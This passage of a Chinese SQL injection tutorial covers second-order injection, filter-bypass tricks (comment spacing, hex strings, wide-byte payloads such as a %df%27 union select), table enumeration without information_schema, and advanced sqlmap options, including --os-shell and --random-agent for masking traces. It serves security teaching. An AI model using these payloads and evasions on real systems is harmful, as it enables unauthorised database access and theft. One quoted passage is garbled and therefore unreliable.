+<h3 id="二次注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-二次注入"><a href="#二次注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-二次注入" class="headerlink" title="二次注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#二次注入)"></a>二次注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#二次注入)</h3><p>二次注入的原理与前面所有的注入方式一致，仅仅在于触发点不同。</p>
+<p>在某些 Web 应用中，注册时对用户的输入做了良好的预处理，但在后续使用的过程中存在未做处理的注入点，此时即可能造成二次注入</p>
+<p>常见的场景，例如某平台在用户注册时无法进行 SQL 注入利用，但在登陆后的用户个人信息界面进行数据查询时存在可利用的注入点。</p>
+<p>那么我们在注册的时候即便无法当即触发 SQL 注入，但可以将恶意 payload 暂时写入到数据库中，这样一来当我们访问个人信息界面查询这个恶意 payload 的时候即会在可利用的注入点触发 SQL 注入。</p>
+<h2 id="SQL-注入常见的过滤绕过方式-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入常见的过滤绕过方式"><a href="#SQL-注入常见的过滤绕过方式-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入常见的过滤绕过方式" class="headerlink" title="SQL 注入常见的过滤绕过方式[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入常见的过滤绕过方式)"></a>SQL 注入常见的过滤绕过方式[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#sql-注入常见的过滤绕过方式)</h2><h3 id="空格被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-空格被过滤"><a href="#空格被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-空格被过滤" class="headerlink" title="空格被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#空格被过滤)"></a>空格被过滤[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#空格被过滤)</h3><ol>
+<li><code>/*xxx*/</code> MySQL 行内注释</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT/*1*/username,password/*1*/FROM/*1*/users;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>()</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT(username),(password)FROM(users);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>%20 %09 %0a %0b %0c %0d %a0 %00</code> 等不可见字符</li>
+</ol>
+<h3 id="引号被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-引号被过滤"><a href="#引号被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-引号被过滤" class="headerlink" title="引号被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#引号被过滤)"></a>引号被过滤[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#引号被过滤)</h3><ol>
+<li>十六进制代替字符串</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=0x4c696b6934</span><br></pre></td></tr></table></figure>
+
+<h3 id="逗号被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-逗号被过滤"><a href="#逗号被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-逗号被过滤" class="headerlink" title="逗号被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#逗号被过滤)"></a>逗号被过滤[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#逗号被过滤)</h3><ol>
+<li><code>from for</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substr(database(),1,1);</span><br><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>join</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2</span><br><span class="line">select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>like/rlike</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>offset</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="比较符号-被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-比较符号-被过滤"><a href="#比较符号-被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-比较符号-被过滤" class="headerlink" title="比较符号 (&lt;=&gt;) 被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#比较符号-被过滤)"></a>比较符号 <code>(&lt;=&gt;)</code> 被过滤[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#比较符号-被过滤)</h3><ol>
+<li><code>=</code> 用 <code>like, rlike, regexp</code> 代替</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where name like &#x27;Liki4&#x27;</span><br><span class="line">select * from users where name rlike &#x27;Liki4&#x27;</span><br><span class="line">select * from users where name regexp &#x27;Liki4&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>&lt;&gt;</code> 用 <code>greatest()、least()</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>between</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id between 1 and 1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="or-and-xor-not-被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-or-and-xor-not-被过滤"><a href="#or-and-xor-not-被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-or-and-xor-not-被过滤" class="headerlink" title="or and xor not 被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#or-and-xor-not-被过滤)"></a><code>or and xor not</code> 被过滤[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#or-and-xor-not-被过滤)</h3><ol>
+<li><code>and = &amp;&amp;</code></li>
+<li><code>or = ||</code></li>
+<li><code>xor = |</code></li>
+<li><code>not = !</code></li>
+</ol>
+<h3 id="常用函数被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-常用函数被过滤"><a href="#常用函数被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-常用函数被过滤" class="headerlink" title="常用函数被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#常用函数被过滤)"></a>常用函数被过滤[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#常用函数被过滤)</h3><ol>
+<li><code>hex()、bin() = ascii()</code></li>
+<li><code>sleep() = benchmark()</code></li>
+<li><code>concat_ws() = group_concat()</code></li>
+<li><code>mid()、substr() = substring()</code></li>
+<li><code>@@user = user()</code></li>
+<li><code>@@datadir = datadir()</code></li>
+</ol>
+<h3 id="宽字节注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-宽字节注入"><a href="#宽字节注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-宽字节注入" class="headerlink" title="宽字节注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#宽字节注入)"></a>宽字节注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#宽字节注入)</h3><p>在 GB2312、GBK、GB18030、BIG5、Shift_JIS 等编码下来吃掉 ASCII 字符的方法，可以用来绕过 <code>addslashes()``id=0%df%27%20union%20select%201,2,database();</code></p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnaRtyUGC0sX3btnFIgpDCob.png" alt="img"></p>
+<h3 id="information-schema-被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-information-schema-被过滤"><a href="#information-schema-被过滤-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-information-schema-被过滤" class="headerlink" title="information_schema 被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#information-schema-被过滤)"></a>information_schema 被过滤[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#information-schema-被过滤)</h3><p>在 SQL 注入中， <code>infromation_schema</code> 库的作用无非就是可以获取到 <code>table_schema, table_name, column_name</code> 这些数据库内的信息。</p>
+<h4 id="MySQL-5-6-的新特性-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-mysql-5-6-的新特性"><a href="#MySQL-5-6-的新特性-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-mysql-5-6-的新特性" class="headerlink" title="MySQL 5.6 的新特性[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#mysql-5-6-的新特性)"></a>MySQL 5.6 的新特性[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#mysql-5-6-的新特性)</h4><p>在 MySQL 5.5.x 之后的版本，MySQL 开始将 innoDB 引擎作为 MySQL 的默认引擎，因此从 MySQL 5.6.x 版本开始，MySQL 在数据库中添加了两张表， <code>innodb_index_stats</code> 和 <code>innodb_table_stats</code> ，两张表都会存储数据库和对应的数据表。</p>
+<p>因此，从 MySQL 5.6.x 开始，有了取代 <code>information_schema</code> 的表名查询方式，如下所示</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name from mysql.innodb_index_stats where database_name=*database*();</span><br><span class="line">select table_name from mysql.innodb_table_stats where database_name=*database*();</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnbMtjAq8osStjcSbFuIdDSc.png" alt="img"></p>
+<h4 id="MySQL-5-7-的新特性-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-mysql-5-7-的新特性"><a href="#MySQL-5-7-的新特性-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-mysql-5-7-的新特性" class="headerlink" title="MySQL 5.7 的新特性[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#mysql-5-7-的新特性)"></a>MySQL 5.7 的新特性[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#mysql-5-7-的新特性)</h4><p>由于 <code>performance_schema</code> 过于发杂，所以 MySQL 在 5.7 版本中新增了 <code>Sys schema</code> 视图，基础数据来自于 <code>performance_chema</code> 和 <code>information_schema</code> 两个库。</p>
+<p>而其中有这样一个视图， <code>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</code> ，我们可以翻阅官方文档对其的解释</p>
+<blockquote>
+<p>查询表的统计信息，其中还包括 InnoDB 缓冲池统计信息，默认情况下按照增删改查操作的总表 I&#x2F;O 延迟时间（执行时间，即也可以理解为是存在最多表 I&#x2F;O 争用的表）降序排序，数据来源：performance_schema.table_io_waits_summary_by_table、sys.x、����ℎ��������������������、���.�innodb_buffer_stats_by_table</p>
+</blockquote>
+<p>其中就包含了存储数据库和对应的数据表，于是就有了如下的表名查询方式</p>
+<p>sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema=*database*();</span><br><span class="line">select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=*database*();</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnV68mdIQmovJwczDsOc53gc.png" alt="img"></p>
+<h3 id="无列名注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-无列名注入"><a href="#无列名注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-无列名注入" class="headerlink" title="无列名注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#无列名注入)"></a>无列名注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#无列名注入)</h3><p>在因为 <code>information_schema</code> 被过滤或其他原因无法获得字段名的时候，可以通过别名的方式绕过获取字段名的这一步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a,b from (select 1 as a, 2 as b union select * from users)x;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnI3jJNlLqq4f7WqRKGEWTeh.png" alt="img"></p>
+<h2 id="超脱-MySQL-之外-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-超脱-mysql-之外-todo"><a href="#超脱-MySQL-之外-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-超脱-mysql-之外-todo" class="headerlink" title="超脱 MySQL 之外 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#超脱-mysql-之外-todo)"></a>超脱 MySQL 之外 (TODO)[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#超脱-mysql-之外-todo)</h2><h3 id="不同数据库后端的判别-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-不同数据库后端的判别"><a href="#不同数据库后端的判别-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-不同数据库后端的判别" class="headerlink" title="不同数据库后端的判别[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#不同数据库后端的判别)"></a>不同数据库后端的判别[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#不同数据库后端的判别)</h3><p>虽然在以往的 CTF 比赛中，MySQL 的出镜率非常高，但在绝大多数的生产环境中（起码在国内），OracleDB、MSSQL 等数据库是绝对的占有率霸主。而一些大型互联网企业则可能使用的是更新的 “高新技术”，例如 ClickHouse、PostgreSQL、MongoDB 等。</p>
+<p>那么如何去判别一个 Web 应用的数据库后端用的是什么呢？</p>
+<p>这一小节就来简单地讲一讲一些针对这种情况的常见方法。</p>
+<h3 id="各数据库的攻击面拓展-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-各数据库的攻击面拓展"><a href="#各数据库的攻击面拓展-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-各数据库的攻击面拓展" class="headerlink" title="各数据库的攻击面拓展[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#各数据库的攻击面拓展)"></a>各数据库的攻击面拓展[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#各数据库的攻击面拓展)</h3><h3 id="noSQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-nosql-注入"><a href="#noSQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-nosql-注入" class="headerlink" title="noSQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#nosql-注入)"></a>noSQL 注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#nosql-注入)</h3><p>工具 nosqlmap</p>
+<h2 id="SQL-注入防范手段-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入防范手段-todo"><a href="#SQL-注入防范手段-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-注入防范手段-todo" class="headerlink" title="SQL 注入防范手段 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入防范手段-todo)"></a>SQL 注入防范手段 (TODO)[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#sql-注入防范手段-todo)</h2><h2 id="一些-CVE-复现-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-一些-cve-复现-todo"><a href="#一些-CVE-复现-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-一些-cve-复现-todo" class="headerlink" title="一些 CVE 复现 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#一些-cve-复现-todo)"></a>一些 CVE 复现 (TODO)[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#一些-cve-复现-todo)</h2><h3 id="ThinkPHP-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-thinkphp-sql-注入"><a href="#ThinkPHP-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-thinkphp-sql-注入" class="headerlink" title="ThinkPHP SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#thinkphp-sql-注入)"></a>ThinkPHP SQL 注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#thinkphp-sql-注入)</h3><h3 id="Django-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-django-sql-注入"><a href="#Django-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-django-sql-注入" class="headerlink" title="Django SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#django-sql-注入)"></a>Django SQL 注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#django-sql-注入)</h3><h3 id="Gorm-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-gorm-sql-注入"><a href="#Gorm-SQL-注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-gorm-sql-注入" class="headerlink" title="Gorm SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#gorm-sql-注入)"></a>Gorm SQL 注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#gorm-sql-注入)</h3><h2 id="数据库注入工具-SQLMAP-及其高级使用指南-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-数据库注入工具-sqlmap-及其高级使用指南"><a href="#数据库注入工具-SQLMAP-及其高级使用指南-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-数据库注入工具-sqlmap-及其高级使用指南" class="headerlink" title="数据库注入工具 SQLMAP 及其高级使用指南[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#数据库注入工具-sqlmap-及其高级使用指南)"></a>数据库注入工具 SQLMAP 及其高级使用指南[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#数据库注入工具-sqlmap-及其高级使用指南)</h2><blockquote>
+<p>这里不讨论诸如 -u 这种简单参数</p>
+</blockquote>
+<h3 id="一些特殊参数-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-一些特殊参数"><a href="#一些特殊参数-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-一些特殊参数" class="headerlink" title="一些特殊参数[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#一些特殊参数)"></a>一些特殊参数[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#一些特殊参数)</h3><h4 id="r-文件名-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-r-文件名"><a href="#r-文件名-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-r-文件名" class="headerlink" title="-r [文件名][](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#r-文件名)"></a>-r [文件名][](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#r-文件名)</h4><p>当你从 Burp 之类的工具中发现了 数据库注入的痕迹</p>
+<p>可以全选右键保存你发送有效载荷（含有 Sql 注入的语句）的明文报文</p>
+<p>复制到文件中保存</p>
+<p>使用 -r 后跟保存的文件 sqlmap 会自动获得发送恶意报文的神奇能力（x 其实是自动解析了）</p>
+<p>对你传入的报文的目标进行自动化的 sql 注入</p>
+<h4 id="–sql-shell-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-shell"><a href="#–sql-shell-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-sql-shell" class="headerlink" title="–sql-shell[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-shell)"></a>–sql-shell[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#sql-shell)</h4><p>在摸索到 数据库注入的时候 生成一个交互式的数据库注入</p>
+<p>可以直接编写可执行的 sql 语句</p>
+<p>例如 select “123”</p>
+<p>Sqlmap 会自动探寻目标的注入返回结果 减少手动编写 payload 的辛劳</p>
+<blockquote>
+<p>尤其是写了半天发现引号对不上等等</p>
+</blockquote>
+<h4 id="–os-shell-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-os-shell"><a href="#–os-shell-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-os-shell" class="headerlink" title="–os-shell[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#os-shell)"></a>–os-shell[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#os-shell)</h4><p>一个新手以为很牛逼但是其实很鸡肋的功能 可以获取 shell 一般是通过数据库注入获取到写文件的权限，写入 webshell 文件 的原理拿到对方机器的 shell</p>
+<p>可是这个玩意非常的鸡肋</p>
+<p>因为 默认数据库配置不具有这种问题需要另外配置 此外环境需要支持类似动态执行的功能 例如 go 起的 web</p>
+<h4 id="–random-agent-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-random-agent"><a href="#–random-agent-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-random-agent" class="headerlink" title="–random-agent[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#random-agent)"></a>–random-agent[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#random-agent)</h4><p>一般不用 但是 sqlmap 在进行 web 的注入时会使用 sqlmap 的 User-Agent 痕迹非常明显</p>
+<p>可以用这个消磨一下自己的痕迹</p>
+<h4 id="–second-url-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-second-url"><a href="#–second-url-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-second-url" class="headerlink" title="–second-url[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#second-url)"></a>–second-url[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#second-url)</h4><p>对于一些非常复杂的数据库二次注入 sqlmap 其实是没有办法的 例如需要鉴权（？）</p>
+<blockquote>
+<p>此处有待考证</p>
+</blockquote>
+<p>但是对于简单的一些二次注入，可以通过这个参数获取到存在数据库注入界面的结果界面。让 sqlmap 获取到 数据库注入的结果。</p>
+<h4 id="–technique-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-technique"><a href="#–technique-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-technique" class="headerlink" title="–technique[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#technique)"></a>–technique[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#technique)</h4><p>技巧 指定 sqlmap 使用的注入技术</p>
+<p>有以下几种</p>
+<ul>
+<li><code>t</code> 基于时间 time</li>
+<li><code>b</code> 基于布尔 boolean</li>
+<li><code>e</code> 基于报错 error</li>
+<li><code>u</code> 联合注入 union</li>
+<li><code>q</code> 内联注入 inline query</li>
+<li><code>s</code> 堆叠注入 stack</li>
+</ul>
+<p>通常而言 sqlmap 在进行自动化注入尝试的时候常常是会先检测到 time 这一类注入</p>
+<p>但是对于 union 和 boolean 则是最后进行检查的</p>
+<p>而往往当你存在 union 或者 boolean 注入的时候，其实 time 多半也会一同存在</p>
